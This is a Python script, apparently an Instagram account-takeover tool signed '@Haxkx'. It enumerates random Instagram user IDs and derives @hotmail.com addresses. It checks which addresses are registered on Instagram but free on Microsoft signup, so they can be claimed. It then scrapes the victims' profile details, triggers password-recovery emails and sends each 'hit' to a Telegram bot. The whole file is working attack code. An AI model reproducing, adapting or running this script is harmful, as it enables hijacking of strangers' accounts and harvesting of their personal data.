import os,webbrowser,datetime
webbrowser.open('https://t.me/haxkx')

import os,requests,sys,time,datetime
now = datetime.datetime.today()
an = datetime.datetime.now()
an2 = datetime.datetime(2025,6,4,0,00)
hours = (now.hour)
if an > an2 or an == an2:
 print("\033[1;31mThe Date : "+ str(an))
 print("\033[1;31mThe Exp Date : "+ str(an2))
 time.sleep(1)
 print('\t\n\033[1;31m Go to sleep    ')
 print('\033[1;31m @Haxkx')
 exit(0)
else: 
 print("\n                             اشتراكك صالح لمدة                            ")
 print("\033[1;31mالوقت حاليا : "+ str(an))
 print('\n')
 print('𓏳'*60)
 print("\033[1;31m\nوقت الانتهاء : "+ str(an2))
 print('')
 print('𓏳'*60)
 print('\t\n\033[1;31m الـــمـــطـــوࢪ   ')
 kilwa = '''''''''''print('𓏳'*50)'''''''''''


try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
ID = input("User Id=>: ")
token = input("Bot Token=>: ")
ids=[]
def get_id():
  id=str(randrange(10000, 30975110))
  if id not in ids:
    ids.append(id)
    return id
  else:
    get_id()
os.system('clear')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r
def info(username,jj):
  global hits
  headers = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'Origin': 'https://www.tucktools.com',
      'Referer': 'https://www.tucktools.com/',
      'User-Agent': generate_user_agent()
  }
  params = {
      'username': username,
  }
  hits+=1

  try:
    response = requests.get('https://instaskull.com/tucktools_new', params=params, headers=headers).json()
    id=response['id']
    name=response['user_fullname']  
    user_followers=response['user_followers']
    user_following=response['user_following']
    total_posts=response['total_posts']
    user_description=response['user_description']
    try:
      date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
    except:
      date='None'
    tlg = f'''
⌯ Hi Haxkx Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓ
folowers : {user_followers}
following : {user_following}
total posts : {total_posts}
username : {username}
email : {username}@{jj}
date : {date}
id : {id}
name : {name}
bio : {user_description}
rest : {rest(username)}
ᯓᯓᯓᯓᯓᯓᯓᯓ
by : @Haxkx
'''
    print(BLUE+tlg)
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    tlg = f'''
    ⌯ Hi Haxkx Got Hit
    ᯓᯓᯓᯓᯓᯓᯓᯓ
    username : {username}
    email : {username}@{jj}
    rest : {rest(username)}
    ᯓᯓᯓᯓᯓᯓᯓᯓ
    by : @Haxkx
    '''
    print(BLUE+tlg)
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
def Haxkx(email):
  global bads_email
  try:
    r=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
    mc=r.cookies.get_dict()['amsc']
    ca=str.encode(r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
    cookies = {
      'amsc':mc,

    }
    headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': ca,
      'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
    }

    json_data = {
      'signInName': email,
    }
    response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',
      cookies=cookies,
      headers=headers,
      json=json_data,
    ).text
    if 'isAvailable' in response:
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:Haxkx(email)
def check(email):
  global bads_instgram
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('001')
    if pp == '0':
      headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
      if 'email_is_taken' in str(response.text):Haxkx(email)
      else:bads_instgram+=1
    elif pp == '1':
      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
          'user-agent': ua,
          'x-csrftoken': csrftoken,
      }
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
      if '"user":true' in response:Haxkx(email)
      else:bads_instgram+=1
  except:
    check(email)


console = Console()
executor = ThreadPoolExecutor(max_workers=15)

with Live(console=console) as live:
  while True:
    tt=(f"\r[green]Hits:[/green] {hits} [red]Bad instgram:[/red] {bads_instgram} [yellow]Email Not Available:[/yellow] {bads_email}")
    live.update(tt)
    id=get_id()
    csrftoken = md5(str(time()).encode()).hexdigest()
    ss=''.join(choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN_-1234567890') for _ in range(20))
    nn=''.join(choice('1234567890') for _ in range(8))
    cookies = {
    'sessionid': nn+'%3A0B9DE81aDu2tUi%3A24%3AAYd0Ni6S9cYk22ZrT6OgaBLW_'+ss,
    }
    headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '0.8',
    'origin': 'https://www.instagram.com',
    'user-agent': generate_user_agent(),
    'x-csrftoken': csrftoken,
    }
    data = {
    '__spin_b': 'trunk',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+id+'","username":"0s9s"}',
    'server_timestamps': 'true',
    'doc_id': '7666785636679494',
    }
    try:
      response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data,cookies=cookies).json()
      username=response['data']['user']['username']
      email = username + '@hotmail.com'
      executor.submit(check, email)
    except:''

# by @Haxkx
#without Any Mistakes


